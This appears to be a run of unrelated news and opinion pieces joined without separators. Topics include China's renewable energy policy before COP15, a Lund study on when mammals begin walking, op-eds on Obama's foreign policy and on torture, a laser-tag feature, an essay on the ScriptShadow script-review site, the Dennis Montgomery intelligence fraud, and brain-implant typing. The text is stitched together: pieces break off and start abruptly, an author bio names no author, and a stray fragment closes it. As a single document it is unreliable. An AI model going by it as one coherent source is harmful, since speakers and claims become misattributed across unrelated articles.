Nis : Background is that China actually has a high use of renewable energy through many years of experience with large hydro electric powerplants .
China did its first law on renewable energy in 2006 and in 2007 they set their first binding targets which were rather ambitious .
They set targets for 2010 .
And now the sector is booming in China and they are very likely to revised upwards .
No new targets have been published but that is of course because of COP15 .
And this will be part of the negotiations as renewable energy is a way of cutting CO2 emissions .
Rumour has it that the target for 2020 might reach 20 percent .
But we already see now that they have raised their partial aims for wind power rather massively and also for solar power .
These indicate that progress is being done and that there are higher aims .
Mads :
So now we already got to the subject of the Copenhagen summit ?
Nis :
Yes , regarding the summit the Chinese proposal is based on the fact that they will not put any specific figure on emission cuts .
But rather limit emissions of green house gasses ( GHG ) per produced unit of GDP .
And this is their way of saying : " We are willing to help with this global issue and we acknowledge that there is a problem .
But we will not limit our growth ! "
So China wants to keep the steam up but will do what they can to limit emissions .
And of course we should see this as a tactical approach to the negotiations , ie .
there has to be something to bargain with .
And the Chinese will probably agree to some sort of a fixed target .
Mads : Regarding the initial Chinese proposal , we have read about the common but differentiated responsibility .
How shall this be understood ?
Nis :
Well this is very much due to the fact that China wants to retain its growth .
But do it in a more sustainable way not emitting as much CO2 .
But it also has to do with energy intensity .
And tying oneself to a fixed target will make it harder to reach .
However this is a more flexible way of working with it .
And then this is also the Chinese way of saying :
It is the developed countries who have created this problem .
Of course China is the world 's largest emitter of CO2 but seen as a whole this problem has been caused by the OECD countries .
And thus China should not be limited so heavily now that China only recently has become part of the problem .
Mads :
So this may also be a reason to ask for technology transfers from the developed countries ?
Nis :
Yes it looks as if this will become a crucial point in the Chinese negotiating tactics .
And here they will ally themselves with the developing countries .
One of the issues is that many of the technologies are already present , amongst other places , in China .
And China is actually a country that possesses some of these technologies .
Particularly solar power .
Actually Chinese firms are on the forefront here .
So there is some reason in being sceptical towards these technology transfers and it's really an issue for western firms and thus also western countries .
The crucial point is that they will want to hold on to their intellectual property rights .
Or else there is not so much of an incitement for investors and firms to develop new technologies .
So what on short term may look as a good solution might on long term harm market development .
And you do need to develop markets for the solutions .
And make them commercial .
But the reason for me being a bit sceptical is that China is already really good at this .
Also regarding developing new technologies .
And it looks as if the Chinese are catching up with the technological advance of the western countries .
Another facet is that China is able to decimate the costs for these solutions that are needed to limit emissions of CO2 .
What we see these days is that China is able to produce very cheap wind turbines because they can get the production costs down .
And the same for solar power .
Mads :
So which renewable solutions are being used in China right now ?
Nis : Mainly hydro electric power which China has been utilizing for a long time .
The big dams are what we hear about here in the west .
But the big new thing is wind power .
And now we also see some large , powerful Chinese companies taking larger market shares .
So the western companies will experience strong competition on the Chinese market .
Another thing that will become extremely large in China is solar power .
Chinese producers are very strong here .
Production of solar panels require a lot of labour and this gives China an edge .
So far American and European companies have had some very good silicone contracts , and silicone is a main component in solar panels , but now the prices have dropped so they have lost this advantage .
The Chinese are also focusing on biomass .
There are a few Chinese companies really advancing here .
And this is such a fabuluos solution because there 's such a lot of agriculture in China .
And it 's really good because it creates growth in rural areas .
And this is a big thing for the Communist Party of China .
To be able to help the lowest of society .
To help the peasants and raise their income .
Biomass helps in the way that the government just buys refuse from the farms and simply puts money in the hands of the farmers .
It can even be organized so that after burning the rubbish they can return the ashes to the farmers and they can use it as fertilizer for the arable land .
So there 's some fantastic opportunities for China .
Evolve agriculture and get economic growth into this sector and at the same time produce energy for the cities .
Mads :
Yes if anybody can do this , it must be the Chinese ?
Nis :
Yes this is where the government can get development going .
And they 've proven themselves really good at this .
The harder part can be enforcement of rules .
Environmental crimes and so forth .
But here it's all about creating markets and promote the use of renewables .
And the Chinese are good at this .
And now they give subsidies creating markets that were not there before .
And this way they get more commercialized .
And on the long run these solutions can work without subsidies .
Mads :
So what about the coal ?
I 've read that 70 percent of Chinese energy comes from coal plants .
Nis :
Yes , this is a problem .
China has almost endless supplies of coal and it's cheap .
So it 's tempting to continue with coal .
But China really feels the consequenses .
And it 's very concrete .
In China the coal is in north and west .
And all the consumption is in the east and the south .
Just transporting the coal gives enormous amounts of dust and people are really suffering from this .
And it is actually these problems that have fueled the ambition to have renewable energy in China .
So China thinks of many aspects of investing in renewable energy .
Both fighting poverty and building a sustainable future .
So renewable energy is one of the strong cards that they play at the summit .
And what China has proposed is ambitious because they have this big supply of coal .
Mads :
So what about the existing polluting coal power plants ?
Should they then be closed ?
Nis :
See this is where people do n't know too much about what is actually going on in China .
The fact is that they are already closing the old power plants .
This is also an easy way to cut emissions .
And then build new and much more efficient ones .
But there 's still a great bit to be gained compared to western technologies , namely Danish technologies .
So far they are only using coal to produce energy ( electricity ) .
But in Denmark we also utilize the excess heat for central heating for people 's homes .
And thus using more of the energy that the coals contain .
So there are areas where the Chinese still can become better .
The fact is that they are working on it .
And despite a growing need for more energy and with tremendous growth they have still achieved to initiate some measures to reduce emissions and also get a higher energy efficiency .
Nis :
One more thing that I think we should also mention is actually China 's largest contribution to reducing emissions .
It 's the China 's family planning policy also some times , a bit misleadingly , referred to as the one child policy .
The fact that China is able to control it 's population growth .
This is simply the single biggest contribution to reducing emissions .
If China had not had this programme there would have been 400 million more Chinese within the next few years .
And they would all have been emitting CO2 .
And this is really one of the biggest contributions at all .
The Giro d'Italia starting in September !
That 's nearly as crazy as the Vuelta a España in finishing in November , but here we are .
At least we have some racing during these covid - 19 times we are living in .
Ed Hood has had a good look at the new course and who 's hot to trot in Italy for the next three weeks .
Why does a human baby need a full year before it can start walking , while a newborn foal gets up on its legs almost directly after birth ?
Scientist have assumed that human motor development is unique because our brain is unusually complex and because it is particularly challenging to walk on two legs .
But now a research group at Lund University in Sweden has shown that human babies in fact start walking at the same stage in brain development as most other walking mammals , from small rodents to elephants .
The findings are published in the journal PNAS .
The Lund group consists of neurophysiologists Martin Garwicz and Maria Christensson and developmental psychologist Elia Psouni .
Contrary to convention , they used conception and not birth as the starting point of motor development in their comparison between different mammals .
This revealed astonishing similarities among species that diverged in evolution as much as 100 million years ago .
--
Humans certainly have more brain cells and bigger brains than most other terrestrial mammalian species , but with respect to walking , brain development appears to be similar for us and other mammals .
Our study demonstrates that the difference is quantitative , not qualitative , says Martin Garwicz .
Based on knowledge about development in other mammals it is therefore possible to actually predict with high precision when human babies will start to walk .
This is a very unexpected and provocative finding .
The notion that humans have a unique position among mammals is not only deeply rooted among lay people , but is also reflected in fundamental assumptions in different research fields related to human development and human brain evolution .
" Our study strongly contradicts this assumption and thereby sheds new light on theories in , for instance , evolutionary and developmental biology , " says Martin Garwicz .
" On the other hand , our findings fit well with the substantial similarities between the genomes of different mammals .
Perhaps these similarities are after all not that surprising -- although the end products ' human ' and ' rat ' may be very different , our study suggests that the building blocks and principles for how these building blocks interact with one another during development could be the same . "
The study originated in an attempt by the group to translate behavioral milestones of motor development between two distantly related species .
The similarities in relative developmental time courses between the two species were so striking that the scientists started to wonder whether the regularity applied to other mammals and ultimately also to humans .
The Lund group has now compared 24 species , which together represent the majority of existing walking mammals .
Some , like the great apes , are closely related to us evolutionarily while others , such as rodents , hoofed animals , and elephants , diverged from our evolutionary path about 90 - 100 million years ago .
Despite this , and regardless of differences in various species ' brain and body size , gestation time , and brain maturity at birth , the comparison shows that the young from all species start walking at the same relative time point in brain development .
Humans may be unique , but not in this particular way .
When the nervous system has reached a given level of maturity , you learn to walk , whether you are a hedgehog , a foal , or a human baby ...
For a president with a daunting domestic agenda and limited experience in foreign policy , Barack Obama has taken on an unusually active world role .
He has made important policy overtures to America ’s adversaries , delivered major addresses in Cairo , Prague , Moscow and at the United Nations , and set a White House record with visits to more than 20 countries in his first year in office .
And with his December speech on Afghanistan , he now owns that war .
Yet it will be at least a year before we know whether the Afghan surge is bringing the hoped - for results .
Iran , North Korea , Syria , Venezuela and Cuba have failed to accept Obama ’s outstretched hand .
Russia has been grudging in its support for more effective policy toward Iran ’s nuclear program , as has China , which also shows no sign of allowing its undervalued currency to rise against the dollar .
Among allies , Europeans have shown only very limited willingness to provide more troops for Afghanistan and have been mostly unwilling to accept Guantanamo inmates , and South Korea and Colombia are irked about trade policy .
Meanwhile , Obama ’s assertive Middle East initiative has left the Israeli - Palestinian peace process worse off than before , has failed to gain support from Arab states and has lost the support of the Israeli public .

Early assessments have focused on specific policy details and missteps not unusual for a new president , but an underlying explanation may have to do with President Obama ’s unique operational style .
First , there is Obama ’s remarkable solipsism , i.e. , his penchant for projecting himself as the personification of U.S. policy .
Personal attraction can be a useful political and diplomatic tool , and polls in Europe and to a lesser extent in Asia and the Mideast confirm that foreigners strongly prefer him to his predecessor .
Nonetheless , the emphasis on the president ’s own persona is quickly wearing thin .
Obama ’s pitch to the Olympic Committee in Copenhagen showcased his Chicago roots but fell flat .
In his September speech to the U.N. General Assembly , he declared , “ I am well aware of the expectations that accompany my presidency around the world , ” but achieved little substantive result .
And in a video to Germany on the 20th anniversary of the fall of the Berlin Wall , which ignored the roles played by Mikhail Gorbachev , Ronald Reagan , Vaclav Havel and others , he managed to observe that “ few would have foreseen . . . that [ Germany ’s ]
American ally would be led by a man of African descent , ” while leaving his audience miffed at his failure to appear in person .
The impression is emerging of overreliance on his own powers of explanation , reassurance and rhetoric .
Second , Obama overestimates the extent to which America ’s adversaries determine their policies in reaction to U.S. rhetoric and policy rather than as expressions of their own values , history and interests .
Emphasis on interdependence , good intentions and the belief that “ the interests of nations and peoples are shared ” does not go very far in explaining the motivations of Vladimir Putin , Mahmoud Ahmadinejad , Bashar Assad or Hugo Chavez .
The message conveyed is that if only he could assure adversaries or allies that he -- and thus America -- means well , threats or problems could be mitigated or overcome altogether .

In a quest to bridge differences , the president sometimes slips into mirror - imaging by downplaying the distinction between allies and adversaries , and in seeking to equate very different kinds of responsibility .
For example , his Cairo speech suggested Western sources for the region ’s problems and downplayed local causes such as authoritarianism , corruption and internal obstacles to social and economic progress .
Anxiously anticipating how others will react may also explain Obama ’s curious downplaying of human rights , as in his muted response to massive protests by the Iranian people over the rigged outcome of the June presidential election , and in his recent China visit .
Third , there remains the president ’s inexperience , coupled with a proclivity for Olympian detachment .
Obama came to office with a very limited legislative background and without having run any large public or private organization .
The result has been missteps that to foreign leaders suggests uncertainty and indecision .
Some have been minor flaps , as in presenting a minimal gift of DVDs of American films to British Prime Minister Gordon Brown , bowing to the Japanese emperor and occasional factual misstatements in speeches .
But other lapses have been more telling .
These have included embarrassing leaks concerning Afghanistan policy , as the president weighed troop requests and carried out a protracted reassessment about what he had described in August as a necessary war .
And allied leaders have begun more openly to voice their doubts .
For example , Polish and Czech leaders expressed dismay at the reversal of the decision to deploy an anti-missile system on their soil .
And after the U.N. speech , French President Nicolas Sarkozy acidly remarked that “ President Obama dreams of a world without weapons . . . but right in front of us , two countries are doing the exact opposite .
. . .
What good has proposals for dialogue brought the international community ?
More uranium enrichment and declarations by the leaders of Iran to wipe a U.N. member state off the map . ”
And , most recently , there was the president ’s delayed public response to the Christmas Day attempt to blow up a Detroit - bound airplane .
His remarks , delivered three days after the event , drew criticism -- both for the delay and for using the word “ allegedly ” in reference to the attacker ’s attempt to ignite an explosive device , and led him to follow up a day later with a more forceful statement .

To be sure , presidents typically face a steep learning curve during their first year .
And given Obama ’s political skills , his handling of foreign policy could become more adept .
Yet the impact of his operational style on policy remains considerable and arguably not well suited to managing two wars and an intransigent Iran , let alone a major foreign policy crisis of the kind that is almost certain to arise at some point during his term .

His most recent book is “ The American Era : Power and Strategy for the 21st Century . ”
George Stephanopoulos just had to give Liz Cheney some more air time on his bobblehead show in another of his " fair and balanced " panels .
Sorry Liz but what 's " inexcusable " is your daddy helping to get us into this quagmire in the first place .
I still want to know when she 's signing up for the military if she wants to keep beating those war drums .
WILL : The danger is that the president is going to be seen as escalating this war .
He ’ll do it half - heartedly with his heart not in it , he will lose his party , and he ’ll be supported by Republicans of the stripe of Liz Cheney , and that ’s not a sustainable path .
CHENEY : Well , let me just say that what I will support is the strategy that actually will win in Afghanistan , a strategy that ’s the one that was laid out by General McChrystal , and I think it ’s just completely inexcusable that we ’ve now had month after month after month of photo - op out of the White House and no decision .
The president is very fond of saying , “ Before I commit troops , I ’m going to think very carefully about it . ”
Somebody in the White House needs to remind him :
He ’s already committed troops .
We ’ve got American men and women in Afghanistan today , because we ’ve got to prevent Afghanistan from again becoming a safe haven for Al Qaida .
The cost of walking away , the cost of defeat , the cost of retreat is huge .
They ’re fighting there today , and they ’re fighting without the kind of resources and reinforcements that he needs -- that they need .
There are a few things most certainly true of torture .
The first is that once a country or society opens the door it becomes the proverbial greased pig , a very slippery and insidious creature to deal with .
Secondly , where we undertake torture we grant the so called terrorists who haunt our world their greatest victory .
Where we willingly collapse hard won human rights and civil liberties - supposedly the very things we hold sacred - and among the things we are defending - we grant the enemy his greatest victory for he has ripped the fabric of our society .
It is also in the greasy nature of torture that where it is detected its practitioners simply make it an even more covert activity .
US president Barack Obama is in an epic struggle with the greased pig of torture .
He promised to close Guantanamo but can no longer do so as the closure has now been delayed at least another year thanks to the US Senate vetoing the funds to do so .
The pig gets even greasier though as simultaneous to the failure to close Guantanamo comes the announcement that the equally infamous Bagram prison in Afghanistan is to be expanded .
So , maybe , just maybe , the Guantanamo torture facility is not being closed at all - just relocated closer to the action and even farther from any sort of scrutiny .
A little more grease is added when it has just been revealed the CIA has been operating one of its “ rendition ” facilities in a former horse riding academy in Lithuania .
To this day it is a well kept secret just how many such facilities are in operation around the world .
The greased pig of torture is a globe trotter , a bounder and respects no borders .
This is the very reason international law must prevail with exceptions made for no country big or small - another subject for another time .
President Obama is not alone in his battle .
Canada 's Prime Minister Stephen Harper has just been confronted with the greased pig of torture .
So far Harper has been running from the pig , terrified of getting any of that nauseous ikky stuff on his impeccable attire ; or should we say his impeccable hypocrisy .
Unruffled , no grease on his hands , he surveys the scene with a sublime indifference .
Harper , of course , leads the only Western government that has steadfastly refused to repatriate its citizens from Quantanamo .
All others , even apple polishing Britain , have successfully done so .
The citizen in question for Harper and Canada is Omar Khadr , the child soldier at the age of 15 years captured in Afghanistan .
The Khadr case has long since taken the measure of this government 's lack of commitment to genuine proactive human rights and revealed its coldhearted disposition on torture .
If Harper does not lose any sleep over the plight of Omar Khadr the testimony of Richard Colvin might just prick his recumbent soul .
Colvin , a former Canadian diplomat in Afghanistan , has testified before a Commons committee Canada has been turning over prisoners destined to be tortured .
We have , it seems , some compelling need to help fill Bagram prison and contribute to its necessary expansion .
Defense Minister Peter Mackay invokes his experience as crown prosecutor in trying to discredit Colvin 's testimony but he is up against a witness of unimpeachable credentials and one still employed in our Washington embassy - an intelligence officer no less - who 's very job it is to know such things .
Mackay 's attempts at character assassination serve only to betray his political desperation .
Canada 's military is deeply integrated into that of the US .
Since the 2004 torture scandal at Iraq 's Abu Ghraib prison it is well known the US has been practicing torture .
Only the utterly nave would be believe that Canada 's military could avoid being complicit in torture and the breaking of international law in this close and utterly compliant relationship .
It now remains to be seen how many other NATO countries serving there are also complicit in torture .
The British army for one is embroiled in a series of torture accusations dating back to the Iraq war .
As long as this not so cuddly little pig has the run of the house all of us get smeared and the blame does not lie totally with our leaders .
We too are refusing to wrestle this not so cuddly little pig as we drift toward being torture tolerant societies .
Stark testimony to this is not only our lack of outrage to torture connected to the less than authentic war on terror but also domestic torture .
Domestic torture comes in the form of our apparent tolerance for the use of the tasers by our police forces .
Both the UN and Amnesty International consider the taser a form of torture .
It was never intended as a lethal weapon , but it now has a proven lethality , and a growing list of victims .
It is a time worn political cliche our leaders are only as good as we make them , and right now we are not making them very good .
President Obama has just returned from China .
Prime Minister Harper is due to go there in the next few weeks .
Gone are the days when Western leaders can step off a plane and start lecturing Chinese leaders on human rights and civil liberties .
We have squandered our moral authority and our moral compass is suffering a grotesque deflection - courtesy of the ruinous war on terror .
Not only do our leaders arrive in that country as economic supplicants , but also as human rights and civil liberties violators .
The most they can do now is compare notes with the Chinese on mutual and pervasive indiscretions .

Crouched behind a thin eucalyptus tree on a crisp Saturday morning , I peer through my gun sight .
I spot someone running through the woods .
I aim for his head .
And fire .
The robotic voice in my gun says " CASUALTY " .
Advertisement
My quarry stops and looks around confused , but makes no effort to take cover .
So I resume firing until my gun yells " Arrrrrrgh ! " , signifying a kill shot .
The LED lights on my opponent 's head flash red and he raises his gun into the air .
This little tree is proving to be the perfect spot for ambushing attackers .
I maybe kind of like pretending to kill people .

Today is BattleSFO , a day - long laser tag capture - the - flag tournament .
The field of conflict is a hilly eucalyptus grove in San Bruno , CA , 45 minutes south of San Francisco , in Juniperro State Park .
There are about 30 people here broken up into platoons of 5 to 7 .
Each player is dressed to the nines in varieties of camouflage , some with black war paint under their eyes .
They 're not quite as geeky as I had expected them to be .
Then again , this is n't exactly the kind of laser tag everyone played as kids .
The gear is bigger and badder , even if the players are not .

Almost the entire crowd of mostly men has never played laser tag outdoors before .
For the most part they 're very friendly , though a little shy when I ask them about themselves .
One team is made up of four guys who went to college together — an electrical engineer , a carpenter , and an options trader .
Another team makes up a local rock band ( they seem more interested in drinking beer and running around the woods in battle gear then actually playing to win . )
Then there 's a group of three middle - aged Asian gentlemen and one of their sons who get together regularly and compete .
They found the game on Meetup.com .
Raymond Wan , who convinced the others to join him in the woods , explains that normally they play paintball .
" The weapons and radio communication make a big difference , " he says .
" I 'm a strategy person .
This is more fun . "
But among the beginners are some veterans of ray gun war .

The general of these mini - gorilla - armies today is Ziggy Tomcich .
Earlier in the morning Tomcich performed his duties as the event 's organizer , scurrying around the picnic table area , AKA central command .
He 's sort of a goofy guy , but his excitement was palpable and I could n't help but giggle a little bit in anticipation of getting my hands on these fake guns and peering down the sight at some unknowing adversary .
As I watched Tomcich untangle headsets , distribute color - coded headbands , and make sure everyone was checking in correctly it was clear that , though his day job is as an audio engineer for the San Francisco Opera , playing laser tag is his true passion in life .
Tomcich has been playing the game since he was a teenager .
Running around the Photon indoor arena in Baltimore at 15 , Tomcich got hooked .
After graduating college he took a job as a designer , marketer , and consultant for several arenas around the country .
Then , in 2006 , Tomcich took laser tag to the next level .
Playing in Armageddon games in the UK and Sweden , where players compete in 3 - 4 day tournaments , Tomcich played outdoor laser tag for the first time .
When he returned to San Francisco , Tomcich realized that the city lacked the kind of gaming he really loved .
Being outdoors and playing laser tag was something , he felt , everyone should do .

" To me , laser tag is an extreme sport , " he says .
For him , part of the fun and the reason why he started his event website SFLastag.org , is the idea that the game is simple to play and creates a highly social environment .
" Unlike most other sports , first - time players in outdoor laser tag can do quite well against seasoned players .
It 's more about strategy and tactics . "
Before the first battle " Cypher , " aka Todd Robinson , who co-owns SpecOps Live Play , a central California company that provided the artillery , gave everyone a rundown of their equipment .
SpecOps imports their guns from an Australian company called Battlefield Sports , essentially an arms dealer that deals in toys .
The company custom builds 10 different models of gaming weapons from sniper rifles to sub machine guns – all equipped with real - world laser sights , speakers for feedback , and sensors to keep track of game stats .
Guns can emulate any of 69 models down to recoil , and fire and reload rates and muzzle flashes ( LEDs , essentially ) .
SpecOps has brought M4 assault rifles , sub machine guns , carbine rifles , and sniper rifles .

During Robinson 's speech , Tomcich chimed in : " Do not aim your gun at non -laser tag players .
These guns do n't exactly look like Hasbro . "
For this game every weapon has 99 clips of 50 rounds .
Those with smaller guns reload in about 5 seconds , the bigger ones about 7 - 10 seconds , so Robinson recommended taking cover while reloading .
" The ‘ bullets ' will bounce off of pavement , " he says .
For this game they 've disabled friendly fire .
But when they hit the laser targets velcro'd to heads that belong to enemies , the guns vocalize the action like weapons with built in sports announcers synthesizing current status of prey as " casualty " , " killed " or " already dead " .

As he went through the briefing , the look on Robinson 's face was more serious then anyone in the eucalyptus grove .
Listening to him describe each weapon and how they worked made it clear to me that , though some people are here to play a game , for others laser tag is a way of life .
In other words , I better take good care of his guns .
Honestly , the weapons are a little intimidating .
First off , they 're huge and I 'm , well , I 'm little .
The guns are so heavy , in fact , that I opted for the smallest one I could find .
I was also one of two girls on the field .
Cypher 's father , who co-owns SpecOps , told me that women actually tend to fair better at this type of laser tag then men .
Women , he said , will hang back and think tactically about the game .
Guys sometimes have a tendency to run out out commando - style and shoot at everything they see .
My tactics were set : I 'd wait for my enemies to come to me .

The game starts and I take up position .
When I shoot people that happen upon my trap , they stood still , look around , and fired recklessly without making much effort to take cover .
Those I shoot over 20 times are killed , sent back to the respawn area ( AKA Command Center , AKA picnic tables ) where Robinson will reset them , reactivate their ordinance and send them back into the fray .

The battle heats up .
Despite my overall aversion in life to things that require running and exercise , the real - world feel of this whole day is bringing up the competitor in me that normally only emerges when I 'm shit - talking people during video games .
It is unclear who is winning at the moment ; the command center tracks the flag movement via new GPS - tracking system and the PC that also handles all the on field comms .
But no one is listening back at HQ .
The General Tomcich is n't attending to the computer anymore .
Instead , Tomcich 's standing across from me in the grove defending our Purple flag from capture .
" We 're encountering heavy resistance , " we can hear over the radio .
" Wear them down , " a player shouts .
Minutes later our fellow Purple team members come running through the brush holding a flag .
Our opponents are not far behind .
But they 're too late .
This round is ours .

Ben Bernanke " Can Create a Trillion Dollars in Secret "
The Senate Banking Committee backing of Fed chairman Ben Bernanke ’s nomination , combined with his designation as Time ’s person of the year , seems to necessitate the healing perspective of the good Doctor Ron Paul this week .
As colleague Joel Bowman astutely noted in The Daily Reckoning , in hindsight Bernanke , with with his new designation , is more apt to be seen as joining the ranks of misguided notables like Stalin and Hitler than the other more celebrated persons of the year .
Witness the video below to hear Dr. Paul describe how Bernanke “ can create a trillion dollars in secret without any monitoring by the Congress , ” and how “ this whole mess that we ’re in , which has a long way to go , has been caused by the Federal Reserve . ”
[ There is an update to this post here . ]
Earlier this year , a blogger going by the name Carson Reeves began reviewing screenplays on a site called ScriptShadow .
These are n’t scripts for existing movies , but rather screenplays to upcoming films — ones in production , ones in development , ones in limbo .
A recent Wired magazine article by Scott Brown discusses his intentions :
[ Reeves ] says he wanted to celebrate the writer , promote talented unknowns ( are n’t most screenwriters pretty much unknowns ? ) , and acquaint newbie scribes with the art of the craft .
“ I ’ve had so many emails from writers all over the world thanking me for making Hollywood feel closer and less intimidating , ” he says .
“ It ’s particularly appealing to amateur screenwriters who want to know what ’s selling .
You have to realize that this is information they ’ve wanted for years but just did n’t have access to . ”
That ’s not really the case .
Aspiring screenwriters have always had access to this material the same way Reeves apparently got access to it : by working and interning in the industry .
In between answering phones and trying to get their bosses on flights out of Kennedy , bright underpaid aspirants have the opportunity to read almost every script in town .
Impromptu networks of assistants pass around their favorite screenplays , in the process picking the next generation of hot writers .
Studios turn a blind eye to this because it helps the industry .
You want the smartest people with the best opinions working for you , and you want them to have a good sense of what ’s in development all over town .
A boss at Disney is n’t going to lose sleep if an intern at CAA reads a draft of that Miley Cyrus comedy .
It ’s expected .
It ’s good .
So ScriptShadow should be a good thing , right ?
More is better .
It ’s not .
And the reasons become clear pretty quickly .
There ’s a big difference between reading a script and reviewing it online for the world to see .
Not only are you spoiling plot details , but you ’re establishing a baseline judgment for a project that ’s often still in its fetal phase .
Brown ’s article is alarmingly upbeat on this point :
Scriptshadow is the logical next step in our increasingly impatient attitude toward the delivery of entertainment .
We ’ve seen the sun set on the medieval Age of Professional Reviews , the rise of the populist recap , and the boom of real - time in - theater Twitter .
The precap , however , trumps them all .
It ’s the kind of access Tinsel - trolls like me have been jonesing for since the ’90s , when Ain’t It Cool News hooked us with preemptive trashings of preview screenings .
And here ’s the rub : just like the AICN reviews of screenings made studios much more reluctant to test their films , sites like ScriptShadow are making them clamp down much harder on the heretofore common practice of passing scripts around .
This is n’t theoretical .
It ’s happening now .
Ruining it for writers
Earlier this year , I worked on a rewrite of a potential tent - pole movie in development at Fox .
A week into my writing , ScriptShadow posted a review ( since removed ) of an earlier draft of the same project .
It was largely laudatory , but the studio went ballistic .
I do n’t know what pressure they put on ScriptShadow to get the review taken down , but I was suddenly given extraordinary restrictions on exactly who could read the script .
I could n’t send it to the director , the producers or anyone other than one executive at the studio .
These were by far the most restrictive terms of any film I ’ve written at any studio .
Keep in mind , this was n’t X - Men or Avatar .
It was one of two dozen movies that could maybe someday get greenlit .
Fox legal was willing to go to war over a movie it might not even make .
The more often sites like ScriptShadow poke that hornet ’s nest , the bigger the reaction is going to be .
The revised terms — I could n’t even send the draft to my agent — may become the norm .
Assistants will get fired for sharing scripts .
In the long run , it will be crippling for the industry , and screenwriters will suffer most :
Screenwriters get hired based on the last few things we wrote , and if those are sealed in vaults , we ’re screwed .
I got my second writing assignment ( A Wrinkle in Time ) based on the script to my first assignment , a project that was still in active development .
If that script had been locked down , I might not have gotten another job .
If I ca n’t get feedback from trusted readers about the script I ’m writing , it wo n’t be as good .
Period .
Pretty soon , blame for one of these “ leaks ” is going to be aimed back at the actual writer , and how would she defend herself ?
If I leave my iPhone or laptop unattended for sixty seconds , it would be nothing for someone to send himself one the drafts I ’ve emailed to myself as backup .
I do n’t want to have to write in a Fox office , on a Fox computer .
But that could very easily be the future .
A better tomorrow
Several screenwriter friends have emailed Reeves , asking him to take down reviews of their scripts .
Every time , he has .
So I believe Reeves when he says he wants to help writers .
Here are two ways he can do it :
Review scripts of movies once they ’ve come out .
Most of the scripts aiming for awards this season have freely - available .pdfs , and Reeves ’ own contacts should enable him to get ahold of the ones that are n’t .
Shining a spotlight on the scripts and their screenwriters would genuinely help readers see how the words on the page were translated to the screen .
Ask writers before posting a review .
No doubt some screenwriters benefit from getting their spec scripts mentioned , just as the Black List has helped draw attention to worthy writers .
As long as Reeves checks in with the writer first — making sure that a review would n’t derail a deal in the works — everyone benefits .
Other sites publish script reviews .
The reason I ’m singling out ScriptShadow is that its owner genuinely seems to have some sense of responsibility to its readers and the screenwriting community .
Hell , it uses Scrippets , so it ca n’t be all evil .
I ’m hoping that by setting the bar higher , ScriptShadow can stop hurting the screenwriters it claims to celebrate .
A con man fooled US spooks into grounding international flights by selling them " technology " to decode al - Qaeda messages hidden in TV broadcasts , it 's claimed .
A long and highly entertaining Playboy article explains that in 2003 , 50 - year - old Dennis Montgomery was chief technology officer at Reno , Nevada - based eTreppid Technologies .
The firm began as a video compression developer , but Montgomery took it in new and bizarre directions .
He reportedly convinced the CIA that he had software that could detect and decrypt " barcodes " in broadcasts by Al Jazeera , the Qatari news station .
The Company was apparently impressed enough to set up its own secure room at the firm to do what Montgomery called " noise filtering " .
He somehow produced " reams of data " consisting of geographic coordinates and flight numbers .
In December 2003 , it 's claimed CIA director George Tenet was sufficiently sold on Montgomery 's data to ground transatlantic flights , deploy heavily armed police on the streets of Manhattan and evacuate 5,000 people from the Metropolitan Museum of Art .
Homeland Security secretary Tom Ridge told the press the terror alert was the result of " credible sources - about near - term attacks that could either rival or exceed what we experienced on September 11 " .
In fact , according to evidence from his former lawyer , Montgomery , the " credible source " , was a " habitual liar engaged in fraud " .
Montgomery worked with the CIA 's Directorate of Science and Technology - its Q Branch - engaged in exotic research and intelligence gathering .
According to Playboy , one counter - intelligence official briefed on the programme said : " We were fucking livid .
I was told to shut up .
I was saying , ' This is crazy .
This is embarrassing . '"
Eventually a branch of French intelligence helped the CIA prove that the Al Jazeera " messages " never existed .
Files were handed over to counter - intelligence to investigate the scam .
The FBI uncovered a series of frauds by Montgomery , who was a compulsive gambler .
As well as his " noise filtering " technology , he had rigged video software to convince officials it could detect weapons .
Following a dispute with eTreppid 's financial backer , Montgomery took off with his " technology " and tried to win more government contracts alone .
By now though , the officials he was trying to sell to were part of the FBI investigation .
It reportedly " went nowhere " , however .
By 2008 , the financial dispute had come to court .
Montgomery said he was still doing classified government work , for $ 3 m .
In June this year however , his gambling led to personal bankruptcy , listing his still - classified " technology " as a $ 10 m asset .
Frances Townsend , a homeland security adviser to Bush , said she did not regret having relied on Montgomery 's mysterious intelligence .
" It did n't seem beyond the realm of possibility .
We were relying on technical people to tell us whether or not it was feasible , " she said . ®
Electrodes placed directly on the surface of peoples ' brains allow them to type just by thinking of letters .
Image
By focusing on images of letters , people with electrodes in their brains can type with just their minds , scientists now reveal .
These findings make up one more step on the road to mind - machine interfaces that may one day help people communicate with just their thoughts .
Researchers have recently employed brain scans to see numbers and maybe even pull videos from inside people 's heads .
The neuroscientists were monitoring two patients with epilepsy for seizure activity with electrodes placed directly on the surface of their brains to record electrical activity generated by the firing of nerve cells .
This kind of procedure requires a craniotomy , a surgical incision into the skull .
How it works
Lead investigator Jerry Shih , a neurologist at the Mayo Clinic campus in Jacksonville , Fla. , wanted to test how well their fledgling mind - machine interface functioned in these patients .
He reasoned it would perform better when electrodes were placed directly on the brain instead of when placed on the scalp , as is done with electroencephalography , or EEG .
Most studies of mind - machine interaction have employed EEG , Shih explained .
" The scalp and bony skull diffuses and distorts the signal , rather like how the Earth 's atmosphere blurs the light from stars , " Shih said .
" That 's why progress to date on developing these kind of mind interfaces has been slow . "
The patients sat in front of a screen that displayed a 6 - by - 6 grid with a single letter inside each square .
Every time a square with a certain letter flashed and the patient focused on it , the electrodes relayed the brain 's response to a computer .
The patients were then asked to focus on specific letters , and the computer recorded that data as well .
After the system was calibrated to each patient 's specific brain waves , when the patient focused on a letter , the letter appeared on the screen .
" We were able to consistently predict the desired letters for our patients at or near 100 percent accuracy , " Shih said .
" While this is comparable to other researchers ' results with EEGs , this approach is more localized and can potentially provide a faster communication rate .
Our goal is to find a way to effectively and consistently use a patient 's brain waves to perform certain tasks . "
How to use it
Once the technique is perfected , its will require patients to have a craniotomy , although it remains uncertain how many electrodes would have to be implanted .
The computers would also have to calibrate each person 's brain waves to desired actions , such as movement of a prosthetic arm , Shih said .
" Over 2 million people in the United States may benefit from assistive devices controlled by a brain - computer interface , " Shih said .
" This study constitutes a baby step on the road toward that future , but it represents tangible progress in using brain waves to do certain tasks . "
These patients would have to use a computer to interpret their brain waves , " but these devices are getting so small , there is a possibility that they could be implanted at some point , " Shih said .
" We find our progress so far to be very encouraging . "
The scientists detailed their findings Sunday in Boston at the annual meeting of the American Epilepsy Society .

BBC 's More or Less
